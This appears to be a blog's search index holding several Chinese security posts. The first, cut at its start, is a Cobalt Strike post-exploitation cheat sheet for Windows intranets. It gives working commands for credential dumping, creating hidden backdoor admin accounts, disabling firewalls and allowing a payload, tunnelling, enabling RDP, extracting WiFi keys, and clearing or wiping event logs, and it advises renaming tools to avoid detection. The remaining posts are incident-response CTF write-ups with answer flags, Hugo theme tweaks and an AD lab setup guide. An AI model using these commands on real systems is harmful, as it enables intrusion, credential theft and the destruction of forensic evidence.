直接复制粘贴过来即可\n4. 查看操作系统和版本信息 1 2 3 4 英文版系统用这个命令： shell systeminfo | findstr /B /C:\u0026#34;OS Name\u0026#34; /C:\u0026#34;OS Version\u0026#34; 中文版系统用这个命令： shell systeminfo | findstr /B /C:\u0026#34;OS 名称\u0026#34; /C:\u0026#34;OS 版本\u0026#34; 5. 查看系统体系结构 检查系统架构（AMD64或者x86）-\u0026gt;影响后续工具选择\n1 shell echo %PROCESSOR_ARCHITECTURE% 6. 主机路由信息 可以查看网络目标，都是主机可以直接访问到的机器\n1 shell route print 7. ARP缓存信息 1 shell arp -a 8. DNS缓存信息 1 shell ipconfig /displaydns 9. Host文件信息 1 shell type C:\\windows\\System32\\drivers\\etc\\hosts 10. 端口连接信息 可以查看当前主机的端口链接情况，一级当前主机与网络中的主机连接建立情况，不仅有公网主机还有内网主机。\n1 shell netstat -ano 11. 会话连接 可以查看主机与客户机之间的会话连接\n1 shell net session 12. 查看当前保存的登录凭证，也能看到通的ip 1 shell cmdkey /l 13. 查看当前主机开启的共享列表 1 shell net share 14. 远程相关信息 1 2 3 4 相关链接： http://bypass.tidesec.com/bycms 命令： shell tasklist 15. 查看当前主机与网络中的其他主机建立的共享链接 1 shell net use 16. 查看主机进程信息 1 shell wmic process get Name,ProcessId,ExecutablePath 可以查看主机进程信息，并作出过滤进程路径，名称和pid。\n17. 指定查看路径信息 1 shell wmic process where Name=\u0026#34;有道云笔记.exe\u0026#34; get ExecutablePath 18. 查看补丁信息 1 shell wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn 19. 查看安装应用信息 1 shell wmic product get Caption,Version PS：在win10中，输入wmic /?会提示wmic已弃用，但在server2012R2,win7等版本可以正常使用\npowershell中可代替该命令的是：Get-WinObject：\n1 Get-WinObject -class win32_product | Select-object -property name,version 20. 查询本机服务 1 shell wmic server list brief 21. 查询目标主机上的杀毒软件 1 2 查询进程：shell tasklist， 或者：shell wmic process list brief 常见的杀软进程：\n进程名 软件 360sd.exe 360杀毒 360tray.exe 360实时保护 ZhuDongFangYu.exe 360主动防御 KSafeTray.exe 金山卫士 SafeDogUpdateCenter.exe 安全狗 McAfee McShield.exe McAfee egui.exe NOD32 AVP.exe 卡巴斯基 avhuard.exe 小红伞 bdagent.exe BitDefender 1 shell wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed 主动防御软件的安装路径\n1 shell wmic /namespace:\\\\root\\SecurityCenter2 path antiVirusProduct Get displayName,productstate,pathtosignedproductexe 22. 查看已启动的程序信息 1 shell wmic startup get command,caption 23. 查看计划任务 1 shell schtasks /query /fo LISR /v 24. 查看主机的开机时间 1 shell net statistics workstation 0x04 探测网段存活 高速内网扫描\n1 shell for /l %i in (1,1,255) do @ping -n 1 -w 30 192.168.12.%i | find /i \u0026#34;ttl= \u0026#34; 随机延迟+长超时\n1 shell for /l %i in (1,1,255) do @ping -n 1 -w 500 192.168.12.%i \u0026amp;\u0026amp; timeout /t 1 \u0026gt;null | find /i \u0026#34;ttl= \u0026#34; 这里看好有没有杀软edr再用，不然就是自首，除非你能二开工具。\n1. 利用betbios快速探测内网 工具：Nbtscan\n1 https://github.com/lifenjoiner/nbtscan 使用cs可以直接上传该脚本。\n1 shell nbscan.exe 10.10.20.0/24 2. 通过arp扫描完整探测内网 下载地址：\n1 https://github.com/QbsuranAlang/arp-scan-windows- 命令:\n1 shell arp.exe -t 10.10.20.0/24 3. 通过ARPScan脚本 下载地址：\n1 2 3 4 https://github.com/Hackplayers/Empire-mod-Hackplayers/tree/master 通过ARP协议进行扫描。 脚本名称：Invoke-ARPScan.ps1 命令：\n1 2 powershell-import powershell Invoke-ARPScan -CIDR 10.10.20.0/24 上传上去：\n执行该命令即可：\n0x05 针对⽂件内容的信息搜集 当对内⽹束⼿⽆策的时候，⼊⼝机器上⾯说不定藏着突破⼝，翻找本地的⽂件和建⽴的⽹络连接就是⼿法\n这⾥也提供⼀个⽂件内容敏感词的字典，需要可以⾃⼰去整理，如下:\n1 2 3 4 5 6 7 8 jdbc: user= password= key= ssh- ldap: mysqli_connect sk- 0x06 配置信息收集 1. web信息 1 run netstat -ano 2. 文档信息 1 2 shell dir /a /s /b c:\\*.xls shell dir /a /s /b c:\\*.doc 3. 查看最近打开的文档 1 shell dir %APPDATA%\\Microsoft\\Windows\\Recent 4. 查看微信信息 1 shell dir /s /b c:\\\u0026#34;WeChat Files\u0026#34; 0x07 网络资产搜集 1. 网络各种配置文件 通常再行动中，入口点都在泛OA，致OA，通OA，用NC等等。\n用NC解密：\n1 2 下载地址： https://github.com/1amfine2333/ncDecode 致OA解密：\n1 2 下载地址： https://github.com/m4yfly/OA-Seeyou 这些常见系统的配置文件地址要记住，如果是其他入口就多找找.config文件\n常见中间件及其配置目录：\n默认安装：\n中间件 目录1 目录2 MySQL C:\\ProgarmData\\MySQL\\MySQL Server C:\\Progarm Files\\MySQL\\MySQL Server SQL Server C:\\Progarm Files\\Miscrosoft SQL Server\\ Oracle Database C:\\app\\oracle\\product PostgreSQL C:\\Progarm Files\\PostgreSQL Redis C:\\Progarm Files\\Redis Apache C:\\Progarm Files\\Apache Group C:\\Progarm Files（x86）\\Apache Nginx C:\\nginx\\conf C:\\Progarm Files\\Nginx\\conf Tomacat C:\\Progarm Files\\Apache 1 2 3 4 C:\\Users\\XXX\\Desktop //用户桌面内容 C:\\Users\\XXX\\Dowloads //用户下载内容 C:\\Users\\XXX\\Documents //用户文档内容 C:\\Users\\XXX\\AppData\\Local //用户软件信息【仅个人安装选项】 0x08 内网工具 1. fscan 1 2 下载地址： https://github.com/shadow1ng/fscan 命令：\n1 2 3 fscan -h 10.10.20.0/24 -np -no -p 445,3389 -np on ping -pn 21指定不要扫描ftp端口，因为容易被查到 可以改名使用：\n1 2 最好改一下名字： mysql.exe -i 10.10.20.0/24 -np -m netbios ms17010扫描:\n1 mysql.exe -i 10.10.20.0/24 -np -m ms17010 常见端口扫描：\n1 mysql.exe -i 10.10.20.0/24 -np -p 22,2222,3389,1433,3306,1521,5432,6379 2. Kscan-轻量化全方位扫描器 1 2 下载地址 https://github.com/lcvvvv/kscan 3. dismap 1 2 下载地址： https://github.com/zhzyker/dismap 原则就是：\n安静 不被发现 尽量用正常的协议 尽量用改造过的工具 0x09 密码凭证收集 1. 主机密码 1 shell logonpasswords 1 shell hashdump dump lsass进程中的hash(巨龙拉东插件)\n1 2 下载地址： https://github.com/k8gege/Ladon 0x10 用户操作相关 1. 当前用户 1 2 3 shell whoami 一般用这个： shell echo %username% 2. 收集用户信息 查看⽤户名，查看⽤户信息\n1 2 net user net user ⽤户名 3. 在线⽤户 1 shell query user 4. 查看域管 1 shell net localgroup administrators 5. 激活Guest 1 2 3 4 shell net user guest /active:yes shell net user guest P@ssw0rd123 shell net localgroup administrators guest /add shell net localgroup administrators 6. 激活administrator 1 2 shell net user Administrator /active:yes shell net user Administrator P@ssw0rd123 7. 创建⽤户 1 2 shell net user ⽤户名 密码 /add #添加⽤户 shell net localgroup administrators ⽤户名 /add #将⽤户加到管理组 8. 创建后⻔⽤户 1 2 3 shell net user test$ P@ssw0rd123 /add shell net localgroup administrators test$ /add shell net localgroup administrators 0x11 查看防⽕墙相关 1 netsh firewall show config 关闭防⽕墙 1 2 netsh firewall set opmode disable //Windows Server 2003 系统及之前的版本 netsh advfirewall set allprofiles state off //Windows Server 2003 系统及之后的版本 ⼀般来说不要操作防⽕墙的开关，⻛险极⼤，只需要查看配置即可\n利⽤允许的⼊站端⼝:\n查看已放⾏端⼝:\n1 shell netsh firewall show portopening 根据防⽕墙配置，⽬标主机已放⾏ TCP 7001 端⼝的⼊站流量（对应 WebLogic 服务端⼝）。我们可以利⽤这个开放端⼝进⾏ Beacon 连接 这仅表示：\n添加防⽕墙规则:\n1 2 3 4 5 # 放⾏7001端⼝的⼊站流量（伪装为WebLogic） netsh advfirewall firewall add rule name=\u0026#34;WebLogic_Service\u0026#34; dir=in protocol=TCP localport=7001 action=allow # 放⾏CS⽊⻢进程路径（可选） netsh advfirewall firewall add rule name=\u0026#34;Java_Update\u0026#34; dir=in program=\u0026#34;C:\\Windows\\Temp\\payload.exe\u0026#34; action=allow 利⽤ ICMP 协议\n1 https://github.com/krabelize/icmpdoor DNS隧道\n1 https://github.com/iagox86/dnscat2 0x12 RDP操作相关 查看RDP端⼝ 1 shell reg query \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /v PortNumber 为16进制数0xd3d，转换为10进制就是3389\n开放RDP服务 1 shell reg add \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\control\\Terminal Server\u0026#34; /v fDenyTSConnections /d 0 /t REG_DWORD /f 开放RDP端⼝ 1 shell netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow 离线破解RDP连接密码 查看是否存在凭证：\n1 shell dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* 获取WiFi密码 查看连接过的Wifi名称：\n1 netsh wlan show profiles 如果乱码可以下载下来看\n1 shell netsh wlan show profiles \u0026gt; wlan.txt 查看指定Wifi的密码：\n1 netsh wlan show profile name=\u0026#34;WIFI名称\u0026#34; key=clear 查看代理 1 shell reg query \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\u0026#34; 0x13 ⽇志痕迹相关 清除事件⽇志 1 2 3 4 5 6 7 8 9 wevtutil cl \u0026#34;Windows PowerShell\u0026#34; wevtutil cl \u0026#34;Security\u0026#34; wevtutil cl \u0026#34;System\u0026#34; wevtutil cl \u0026#34;Application\u0026#34; Security：登录/特权操作记录 Windows PowerShell：PS执⾏历史 System：系统服务/驱动事件 Application：应⽤程序事件 停⽌⽇志相关服务 1 2 3 4 5 6 阻⽌新⽇志⽣成 禁⽤事件转发功能 中断⽇志记录链 sc stop Schedule sc stop wecsvc sc stop eventlog 永久禁⽤⽇志服务 1 sc config EventLog start= disabled ⽇志⽂件覆盖 1 2 3 4 5 # 物理覆盖⽇志⽂件 cipher /w:C:\\Windows\\System32\\winevt\\Logs\\Security.evtx 使⽤cipher⼯具进⾏3次覆盖写⼊ 防⽌⽂件恢复⼯具提取⽇志 0x13 CS插件 OLa 下载地址：\n1 https://github.com/d3ckx1/OLa/tree/main cs2插件，直接可以在cs2中使用：\ntaowu 下载地址：\n1 https://github.com/Mr-xn/taowu-cobalt-strike cs2插件\nLSTAR - Aggressor 下载地址：\n1 https://github.com/lintstar/LSTAR/ cs插件\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/13.webp","permalink":"http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"【内网攻防】Windows工作组信息收集"},{"content":"简介 题目来源公众号 vulntarget\n1 https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg 任务环境说明：\nwindows账密：workstation/admin@20221123\nweb端口外部无法访问，请RDP连接上机排查\nflag1 主站进入后台的文件名称？\n查看apache日志，找到php后缀日志。\n1 flag{FNeSOgYGkp.php} flag2 黑客是从哪个端口上传木马文件的?\n打开小皮查看网页端口，7001打不开，所以为80\n1 flag{80} flag3 黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)\n直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。\n1 flag{api3.php:Admin} flag4 可以根据日志查看：\n1 flag{192.168.112.123} 完成！！！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/7.webp","permalink":"http://localhost:1313/p/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAvulntarget-j-01/","title":"【应急响应靶场】vulntarget-j-01"},{"content":"前景需要 1 2 3 看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！ 1. 黑客的IP地址 2. 遗留下的三个flag 虚拟机账号/密码\n1 2 账号/密码：defend/defend 账号/密码：root/defend 1. 黑客的IP地址 1 2 3 查看日志文件,Linux查看/var/log/wtmp文件查看可疑IP登陆 last -f /var/log/wtmp 或者直接使用命令 lastlog命令 可以看出192.168.75.129，非常可疑。 1 答案：192.168.75.129 2. 第一个flag 1 2 3 黑客使用root登录了系统，我们可以先去root用户下看看黑客使用了什么命令： 使用命令：history 得到第一个flag：thisismybaby 1 答案：flag{thisismybaby} 3. 第二个flag 1 2 3 4 5 从第一个flag中我们可以看出，黑客对/etc/rc.d/rc.local进行编辑和提升了执行权限 Linux中/etc/rc.d/rc.local 用于添加开机启动命令 我们cd /etc/rc.d/下，使用ls -la ，查看有rc.local，直接用cat rc.local得到第二个flag 1 答案：flag{kfcvme50} 4. 第三个flag 1 我们通过查看log日志，我们发现一个redis日志文件，然后看一下redis日志并没有什么结果，那么我们去看一下redis配置文件（more /etc/redis.conf）就得到第三个flag。 1 答案：flag{P@ssWrd_redis} 全部答案： 1 2 3 4 192.168.75.129 flag{thisismybaby} flag{kfcvme50} flag{P@ssW0rd_redis} ","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/8.webp","permalink":"http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/","title":"【知攻善防靶场】Linux1"},{"content":"前提须知 1 2 3 4 5 6 7 8 9 看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！ （1）提交攻击者IP （2）提交攻击者修改的管理员密码(明文) （3）提交第一次Webshell的连接URL （4）提交Webshell连接密码 （5）提交数据包的flag1 （6）提交攻击者使用的后续上传的木马文件名称 （7）提交攻击者隐藏的flag2 （8）提交攻击者隐藏的flag3 虚拟机账号/密码：\n1 2 账号：root 密码：Inch@957821. 1. 提交攻击者IP 方法一： 1 2 首先看一下管理员登录情况，确定一下黑客登录IP 命令：last -f /var/log/wtmp 方法二： 1 2 如果不确定的话，我们可以登录bt面板看一下 这里我看var目录文件时，看到了bt配置文件，那就bt看一下 1 果然安装了宝塔，那就登录一下，因为不知道面板的密码那我们就直接修改一下面板的密码。 然后看一下面板的默认信息，看一下url地址\n1 2 3 4 5 外网面板地址: \u0026lt;https://58.247.126.6:12485/5a2ce72d\u0026gt; 内网面板地址: \u0026lt;https://192.168.198.130:12485/5a2ce72d\u0026gt; username: uysycv5w password: admin123 进行登录。 1 2 我们从bt面板里面看到了他添加了一个网站，我们去看一下他的日志（这里我就不用宝塔面板中的去查看日志了），我们首先去/www/wwwlogs目录下127.0.0.1.log 查看一下日志 使用命令：cat 127.0.0.1.log | gerp 200 1 答案：192.168.20.1 2. 提交攻击者修改的管理员密码(明文) 1 在宝塔面板发现一个phpmyadmin的mysql数据库，进管理看数据，找密码即可。 1 2 3 找到一个x2_user表，密码,这里使用过的是md5进行加密的，不清楚的可以去网上搜一下或者看一下源码，md5加密是不可逆的，但是可以在网上公开的网站进行解密： URL：\u0026lt;https://www.somd5.com/\u0026gt; 答案：Network@2020 1 答案：Network@2020 3. 提交第一次Webshell的连接URL 1 2 查看流量包，可以看出 index.php?user-app-register 1 Webshell的连接：\u0026lt;http://192.168.198.130/index.php?user-app-register\u0026gt; 4. 提交Webshell连接密码 1 根据题目3可以看出。 1 2 webshell密码是：Network2020 使用蚁剑进行连接。 5. 提交数据包的flag1 1 2 3 4 ls一下，你就会发现默认的文件夹下给了一个流量数据包，下载这个数据包使用wireshark进行分析。 [root@web-server ~]# ls anaconda-ks.cfg wp 数据包1.pcapng 1 首先，过滤一下http报文，可以看到这些报文都是攻击者192.168.20.1在访问Linux主机。 1 先浏览一下过滤出来的报文，发现攻击者访问了/flag1路径，追踪http流。 1 发现了一个第一个flag：flag1{Network@_2020_Hack}，提交判题程序得知正确。 1 答案：flag1{Network@_2020_Hack} 6. 提交攻击者使用的后续上传的木马文件名称 1 查看数据包，可以看出，黑客上传了一个version2.php文件。 1 答案：version2.php 7. 提交攻击者隐藏的flag2 1 根据命令可以看出，黑客进入了127.0.0.1文件夹，并创建了一个隐藏文件夹.api，进入后查看 1 可以看出他编辑了这两个文件，cat看一下。 1 cat alinotify.php,发现flag2。 1 答案：$flag2 = \u0026#34;flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}\u0026#34;; 8. 提交攻击者隐藏的flag3 1 使用命令：history,查看历史使用过的命令可以发现 1 答案：flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ} 全部答案： 1 2 3 4 5 6 7 8 192.168.20.1 Network@2020 \u0026lt;http://192.168.198.130/index.php?user-app-register\u0026gt; Network2020 flag1{Network@_2020_Hack} version2.php flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9} flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ} ","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/14.webp","permalink":"http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/","title":"【知攻善防靶场】Linux2"},{"content":"题目解题 1、注册一个账户，登陆并添加一个账户\n2、通过转账功能，向ID为6的账户转账\n3、转账时抓包\n4、抓包后通过测试并发获取更多钱。\n5、两个ID相互转账并多次并发，得到最后的金额购买最后一个礼物，得到flag。\n","date":"2025-08-27T00:00:00Z","image":"http://localhost:1313/images/9.webp","permalink":"http://localhost:1313/p/ctf%E8%A7%82%E5%AE%89%E6%9D%AFctf-ezbank/","title":"【CTF】观安杯CTF-Ezbank"},{"content":"0x01 搭建方式 直接拉取我的github仓库文件即可：\n1 https://github.com/SSlimes/Blog 0x02 stack主题修改 1. 字体修改： 前往【100font】，下载自己想要的字体，字体文件为 fusion-pixel-10px-monospaced-zh_hans.ttf 把字体文件放入assets/font下(文件夹自己创建) 将以下代码修改并复制到layouts/partials/footer/custom.html文件中(文件不存在就自己创建) 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;style\u0026gt; @font-face { font-family: \u0026#39;字体名\u0026#39;; src: url({{ (resources.Get \u0026#34;font/字体文件名\u0026#34;).Permalink }}) format(\u0026#39;truetype\u0026#39;); } :root { --base-font-family: \u0026#39;字体名\u0026#39;; --code-font-family: \u0026#39;字体名\u0026#39;; } \u0026lt;/style\u0026gt; 2. 背景图片 将以下代码复制到layouts/partials/footer/custom.html文件中(文件不存在则自行创建)\n1 2 3 4 5 6 7 8 9 \u0026lt;style\u0026gt; body { background: url({{ (resources.Get \u0026#34;background/bz.png\u0026#34;).Permalink }}) no-repeat center top; background-size: cover; background-attachment: fixed; backdrop-filter: blur(50px); -webkit-backdrop-filter: blur(50px); /* 注意：这里建议和上面的模糊值保持一致，避免兼容问题 */ } \u0026lt;/style\u0026gt; 3. 首页欢迎横幅 在 /layouts/index.html 的 \u0026lt;section class=\u0026quot;article-list\u0026quot;\u0026gt; 前添加以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- 首页欢迎字幅 --\u0026gt; \u0026lt;div class=\u0026#34;welcome\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;font-size: 4rem; text-align: center; font-weight: bold; text-shadow: 0 2px 3px rgba(0,0,0,0.15);\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;shake\u0026#34;\u0026gt;👋\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text1\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt; Welcome\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text2\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt; To \u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text3\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;S\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text4\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;l\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text5\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;i\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text6\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;m\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text7\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;e\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text8\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;r\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text9\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text10\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;s\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text11\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt;Blog\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 首页欢迎字幅 --\u0026gt; 4. macOS风格的代码块 准备一张macOS代码块的红绿灯图片(Ctrl+S保存), 放到static/icons文件夹下 将以下代码复制进assets/scss/custom.scss文件中(不存在则自行创建) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 .highlight { border-radius: var(--card-border-radius); max-width: 100% !important; margin: 0 !important; box-shadow: var(--shadow-l1) !important; } .highlight:before { content: \u0026#34;\u0026#34;; display: block; background: url(../icons/macOS-code-header.svg) no-repeat 0; background-size: contain; height: 18px; margin-top: -10px; margin-bottom: 10px; } 5. 头像旋转 在 /assets/scss/custom.scss 中加入以下代码：\n1 2 3 4 5 6 7 8 // 头像旋转动画 .sidebar header .site-avatar .site-logo { transition: transform 1.65s ease-in-out; // 旋转时间 } .sidebar header .site-avatar .site-logo:hover { transform: rotate(360deg); // 旋转角度为360度 } ","date":"2025-08-27T00:00:00Z","image":"http://localhost:1313/images/2.webp","permalink":"http://localhost:1313/p/%E5%85%B6%E4%BB%96/","title":"【Hugo】hugo-stack主题魔改-1"},{"content":"博客运行时间 1. 完成样式 2. footer.html文件修改 在layouts\\partials\\footer\\footer.html目录下新增以下代码：（没有该文件则自己创建）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 {{ with .Site.Params.footer.runtimeSince }} \u0026lt;section class=\u0026#34;runtime\u0026#34; style=\u0026#34;margin-top:8px;font-size:1.3rem\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;site-runtime\u0026#34;\u0026gt;站点已运行计算中...\u0026lt;/span\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;script\u0026gt; (function(){ var sinceStr = \u0026#39;{{ . }}\u0026#39;.replace(\u0026#39;T\u0026#39;,\u0026#39; \u0026#39;).replace(\u0026#39;t\u0026#39;,\u0026#39; \u0026#39;); var start = new Date(sinceStr); function update(){ var now = new Date(); var diff = Math.max(0, now - start); var days = Math.floor(diff / (24*60*60*1000)); var hours = Math.floor((diff % (24*60*60*1000)) / (60*60*1000)); var mins = Math.floor((diff % (60*60*1000)) / (60*1000)); var secs = Math.floor((diff % (60*1000)) / 1000); var el = document.getElementById(\u0026#39;site-runtime\u0026#39;); if(el){ el.textContent = \u0026#39;站点已运行 \u0026#39; + days + \u0026#39; 天 \u0026#39; + hours + \u0026#39; 小时 \u0026#39; + mins + \u0026#39; 分 \u0026#39; + secs + \u0026#39; 秒\u0026#39;; } } update(); setInterval(update, 1000); })(); \u0026lt;/script\u0026gt; {{ end }} 3. 修改config.yaml文件 在config.yaml文件下新增该内容即可\n1 runtimeSince: 2025-08-025T00:00:00 # 站点开始运行的时间（本地时区），用于页脚运行时间 4. 修改custom.scss文件按 让页脚运行时间颜色与版权一致。修改\\assets\\scss\\custom.scss文件。（没有自己创建即可）\n1 2 3 4 5 6 /* 页脚运行时间颜色与版权一致 */ footer.site-footer { .runtime { color: var(--accent-color); font-weight: bold; } ","date":"2025-08-27T00:00:00Z","image":"http://localhost:1313/images/3.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%8D%9A%E5%AE%A2%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4/","title":"【Hugo】hugo-stack主题魔改-博客运行时间"},{"content":"0x00 前置知识 需要三个windows_server虚拟机。\n这里我使用2012做主域，只能上相兼容不能向下兼容。\n使用windows_server_2012做主域，就不能使用2008做子域了。\n这就可以看出一般主域的服务器版本很低。\n三台服务器分别为（域控）（子域）（辅域）\n0x01 主域的搭建 修改网络配置为自定义的一个网段（192.16.100.1/24），为了确保都在同一网段。\n关闭防火墙\n设置IP地址：192.168.100.100为域控的IP，后续DNS服务器地址就是192.168.100.100。\n修改名称：此电脑-\u0026gt;属性，修改名称为：DC，然后重启一下。\n添加角色服务，Active Directory域服务和DNS服务器，安装好之后会自动重启一下即可。\n配置域环境，添加新林为：slimer.com后，进行等待，大约2分钟左右\n输入自己设置的密码即可（p-0p-0p-0..）\n下一步\n默认即可\n默认即可\n安装，然后重启一下，完成域控的搭建。\n重启完成后，将网卡重启一下，就可以看到域环境了。\n这里会多出来一个域防火墙，记得给关了。\n0x02 子域的搭建 关闭防火墙\n设置网卡为同一网段。\n设置IP地址，DNS为域控的IP地址。\n修改 计算机名称为:RODCServer 隶属于slimer.com域\n改： 计算机名改成administrator 密码为开机密码：p-0p-0p-0\n重启查看一下是否成功连接到slimer.com域\n安装域环境，选好之后，直接下一步安装即可。\n部署子域，新域名为：RODCServer。\n换一下自己机器的凭据。 账号：administrator 密码：p-0p-0p-0\n9.设置密码（满足复杂度） 密码：p-0p-0p-0..\n10.一直下一步，直到安装即可。\n11.在工具中找到 AD域和信任关系 就可以进行配置了，这里先这样后续再处理。\n0x03 辅域的搭建 只读域控，辅助域控\n只读域控制器（Read-only Domian Controller，RODC）的AD DS数据库只可以被读取，不可以被修改，也就是说用户或应用程序无法直接修改RODC 的AD DS数据库。RODC的AD DS数据库内容只能够从其他可读写的域控制器复制过来。RODC主要设计给远程分公司网络来使用的，因为一般来说远程分公 司的网络规模比较小，用户人数较少，此网络的安全措施或许并不如总公司完备，也可能缺乏IT技术人员，因此采用RODC可避免因其AD DS数据库被破坏 影响整个AD DS环境。\n辅助域控制器，在主域控不工作的事情下，辅助可以顶替他继续工作。\n安装SUBDCServer（辅域）\n注意：IP地址不要重复 要提前关闭防火墙\n修改IP（如上步骤）IP地址修改（与域控不同）但（首选DNS服务器选择域控IP）\n右击（这台电脑）然后点击（属性）再点击（更改配置）然后点击（更改）最后 计算机名改为（SUBDCServer） 属于选择（域）并添加为（slimer.com）\n改 计算机名（administrator） 密码（开机密码）p-0p-0p-0\n添加该两个功能，直接默认安装即可。\n将此服务器提升为域控制器即可。\n点击 将域控制器添加到现有域 点击 更改 输入域控用户和密码 账户：administrator 密码：p-0p-0p-0\n勾选域名系统服务器全局编录作为辅助域控输入密码（需要满足密码复杂性） 密码：p-0p-0p-0..\n复制自 选为 DC.slimer.com\n点击下一步 一直到 安装\n","date":"2025-08-27T00:00:00Z","image":"http://localhost:1313/images/1.webp","permalink":"http://localhost:1313/p/%E5%86%85%E7%BD%91%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-01/","title":"【内网】域环境搭建-01"}]